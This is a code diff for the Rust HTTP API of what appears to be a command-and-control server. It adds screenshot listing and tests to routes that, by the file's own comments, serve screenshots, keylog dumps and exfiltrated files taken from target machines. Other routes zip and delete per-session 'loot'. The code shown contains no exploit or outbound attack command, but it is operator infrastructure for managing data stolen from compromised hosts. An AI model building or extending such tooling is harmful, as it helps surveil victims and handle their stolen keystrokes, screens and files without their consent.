@@ -1,15 +1,15 @@
 // src/api/routes/downloads.rs
 //
 // GET /api/hosts/:id/screenshots
-//   Lists screenshot folders saved by the server for a given session.
-//   Returns them newest-first so the panel can pick up the latest capture.
+//   Lists the RCM Sec-11 screenshots stored in the session's package,
+//   newest-first, so the panel can pick up the latest capture.
 //
 // GET /api/downloads/*path
 //   Serves any file under the server-side `downloads/` directory.
 //   Path traversal is blocked by rejecting `..` components.
 //   Requires X-API-KEY auth (enforced by the router's middleware layer;
 //   ?key=<api_key> is accepted as a fallback for <img>/<a href> uses).
-//   NOTE: this route must never be registered in public_routes — it serves
+//   NOTE: this route must never be registered in public_routes - it serves
 //   screenshots, keylog dumps, and exfiltrated files.
 
 use axum::{
@@ -22,38 +22,121 @@ use axum::{
 use std::{path::PathBuf, sync::Arc};
 use crate::api::state::ApiContext;
 
-// ── Screenshot folder listing ─────────────────────────────────────────────────
+// ── Screenshot listing (RCM Sec-11 layout) ────────────────────────────────────
 
+/// One stored screenshot frame, addressed relative to downloads/.
+#[derive(serde::Serialize)]
+struct ShotEntry {
+    file: String,              // "<RootFolder>/output/screenshots/<name>"
+    ts: String,                // "YYYYMMDD-HHMMSS" from the Sec-11 filename
+    monitor: Option<u64>,      // digits after "monitor" in toolspecific
+}
+
+/// Parse a Sec-11 screenshot filename
+/// `screenshot.<YYYYMMDD-HHMMSS>.<toolspecific>[.<counter>].<ext>`
+/// into a ShotEntry. Sidecars (*.RCM.xml) and non-screenshot files are skipped.
+fn parse_shot_name(name: &str, root_name: &str) -> Option<ShotEntry> {
+    if !name.starts_with("screenshot.") || name.ends_with(".RCM.xml") {
+        return None;
+    }
+    let parts: Vec<&str> = name.split('.').collect();
+    if parts.len() < 4 {
+        return None;
+    }
+    let ts = parts[1];
+    // is_ascii guards the byte-slicing below: a 15-byte non-ASCII ts would
+    // otherwise panic on the non-char-boundary slices ts[..8] / ts[9..].
+    if ts.len() != 15
+        || !ts.is_ascii()
+        || !ts[..8].chars().all(|c| c.is_ascii_digit())
+        || &ts[8..9] != "-"
+        || !ts[9..].chars().all(|c| c.is_ascii_digit())
+    {
+        return None;
+    }
+    let toolspecific = parts[2];
+    let monitor = toolspecific.strip_prefix("monitor").and_then(|rest| {
+        let digits: String = rest.chars().take_while(|c| c.is_ascii_digit()).collect();
+        if digits.is_empty() { None } else { digits.parse::<u64>().ok() }
+    });
+    Some(ShotEntry {
+        file: format!("{}/output/screenshots/{}", root_name, name),
+        ts: ts.to_string(),
+        monitor,
+    })
+}
+
+/// GET /api/hosts/:id/screenshots
+///
+/// Resolves the session's RCM package (hostname/computer_id from the
+/// sessions table) via a marker-verified, NON-CREATING lookup and lists
+/// the Sec-11 screenshots stored in it, newest-first. `folders` is kept for
+/// older panels; the updated panel consumes `shots`.
+///
+/// The lookup mirrors session::package_if_exists: it scans root-name
+/// candidates and accepts only the one whose `.rcmtarget` marker matches
+/// THIS session's target identity - so two targets sharing a hostname
+/// (different computer_id) can never be handed each other's screenshots -
+/// and it never creates a package (a GET must not mint package dirs; with
+/// lazy packages a session may legitimately have none yet).
 pub async fn list_screenshots(
     Path(session_id): Path<u32>,
-    State(_state): State<Arc<ApiContext>>,
+    State(state): State<Arc<ApiContext>>,
 ) -> impl IntoResponse {
-    let downloads = PathBuf::from("downloads");
-    // Convention: {timestamp}_{session_id}_screenshot  (matches file_transfer naming)
-    let suffix = format!("_{}_screenshot", session_id);
-
-    let mut folders: Vec<String> = tokio::task::spawn_blocking(move || {
-        let Ok(entries) = std::fs::read_dir(&downloads) else {
-            return vec![];
-        };
-        entries
-            .filter_map(|e| {
-                let name = e.ok()?.file_name().into_string().ok()?;
-                if name.ends_with(&suffix) {
-                    Some(name)
-                } else {
-                    None
-                }
+    let (folders, shots) = tokio::task::spawn_blocking(move || {
+        let (hostname, computer_id) = state
+            .db
+            .get()
+            .ok()
+            .and_then(|conn| {
+                conn.query_row(
+                    "SELECT hostname, computer_id FROM sessions WHERE id = ?1",
+                    rusqlite::params![session_id],
+                    |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)),
+                )
+                .ok()
             })
-            .collect()
+            .unwrap_or_default();
+
+        let empty: (Vec<String>, Vec<ShotEntry>) = (vec![], vec![]);
+        if hostname.is_empty() && computer_id.is_empty() {
+            return empty;
+        }
+
+        let Some(pkg) = crate::server::session::package_if_exists(&hostname, &computer_id)
+            else { return empty };
+
+        let shots_dir = pkg.root().join("output").join("screenshots");
+        let root_name = pkg.root_name();
+        let mut shots: Vec<ShotEntry> = Vec::new();
+        if let Ok(entries) = std::fs::read_dir(&shots_dir) {
+            for e in entries.flatten() {
+                // Never follow symlinks inside the package.
+                if e.file_type().map(|t| t.is_symlink()).unwrap_or(true) {
+                    continue;
+                }
+                if let Some(shot) = parse_shot_name(
+                    &e.file_name().to_string_lossy(),
+                    &root_name,
+                ) {
+                    shots.push(shot);
+                }
+            }
+        }
+        // Newest-first (ts is fixed-width so lexicographic sort works).
+        shots.sort_by(|a, b| b.ts.cmp(&a.ts).then_with(|| b.file.cmp(&a.file)));
+
+        let folders = if shots_dir.is_dir() {
+            vec![format!("{}/output/screenshots", root_name)]
+        } else {
+            vec![]
+        };
+        (folders, shots)
     })
     .await
     .unwrap_or_default();
 
-    // Newest-first (folder names embed a timestamp so lexicographic sort works)
-    folders.sort_by(|a, b| b.cmp(a));
-
-    Json(serde_json::json!({ "folders": folders }))
+    Json(serde_json::json!({ "folders": folders, "shots": shots }))
 }
 
 // ── File serving ──────────────────────────────────────────────────────────────
@@ -167,7 +250,7 @@ pub async fn list_loot(
 
 /// GET /api/loot/zip?path=<folder_path>
 /// Recursively zips everything under downloads/<path> and returns it as
-/// a single application/zip download.  Useful for pulling an entire
+/// a single application/zip download. Useful for pulling an entire
 /// session's loot folder in one click from the panel.
 pub async fn zip_loot(
     axum::extract::Query(params): axum::extract::Query<std::collections::HashMap<String, String>>,
@@ -199,13 +282,13 @@ pub async fn zip_loot(
     //
     // The zip bytes are produced in a spawn_blocking thread by
     // streaming_zip::write_zip_directory and forwarded through a bounded
-    // mpsc channel to the Axum response body.  Because we never buffer the
-    // whole archive, RAM usage is constant regardless of folder size — a 1 TB
+    // mpsc channel to the Axum response body. Because we never buffer the
+    // whole archive, RAM usage is constant regardless of folder size - a 1 TB
     // folder uses the same ~64 KB copy buffer as a 1 KB folder.
     //
     // No temp file is needed: the previous approach wrote a tempfile first
     // (limiting the archive size to available temp-disk space) then streamed
-    // it back.  The streaming approach has no such limit.
+    // it back. The streaming approach has no such limit.
 
     let base_path = full.parent()
         .map(|p| p.to_path_buf())
@@ -217,7 +300,7 @@ pub async fn zip_loot(
 
     tokio::task::spawn_blocking(move || {
         /// Write impl that batches output into 64 KB chunks and sends them
-        /// through the channel.  Implements backpressure via blocking_send.
+        /// through the channel. Implements backpressure via blocking_send.
         struct ChanWriter {
             tx:  tokio::sync::mpsc::Sender<Vec<u8>>,
             buf: Vec<u8>,
@@ -297,5 +380,38 @@ pub async fn delete_loot(
     match result {
         Ok(Ok(_)) => StatusCode::NO_CONTENT.into_response(),
         _ => StatusCode::NOT_FOUND.into_response(),
+    }
+}
+
+
+#[cfg(test)]
+mod tests {
+    use super::parse_shot_name;
+
+    #[test]
+    fn parse_shot_name_accepts_valid_sec11_name() {
+        let shot = parse_shot_name("screenshot.20260722-081100.monitor0.png", "HOST-A")
+            .expect("valid Sec-11 name");
+        assert_eq!(shot.ts, "20260722-081100");
+        assert_eq!(shot.monitor, Some(0));
+        assert_eq!(shot.file, "HOST-A/output/screenshots/screenshot.20260722-081100.monitor0.png");
+    }
+
+    #[test]
+    fn parse_shot_name_skips_sidecars_and_foreign_files() {
+        assert!(parse_shot_name("screenshot.20260722-081100.monitor0.RCM.xml", "H").is_none());
+        assert!(parse_shot_name("other.20260722-081100.monitor0.png", "H").is_none());
+        assert!(parse_shot_name("screenshot.short.monitor0.png", "H").is_none());
+    }
+
+    #[test]
+    fn parse_shot_name_non_ascii_15byte_ts_does_not_panic() {
+        // 15 BYTES but only 8 chars, non-ASCII: the old byte-slicing
+        // (ts[..8] / ts[9..]) panicked on the non-char boundary, blanking
+        // the whole screenshot listing. Must return None instead.
+        // "ééééé" = 10 bytes + "12345" = 15 bytes total.
+        let name = "screenshot.ééééé12345.monitor0.png";
+        assert_eq!(name.split('.').nth(1).unwrap().len(), 15);
+        assert!(parse_shot_name(name, "H").is_none());
     }
 }
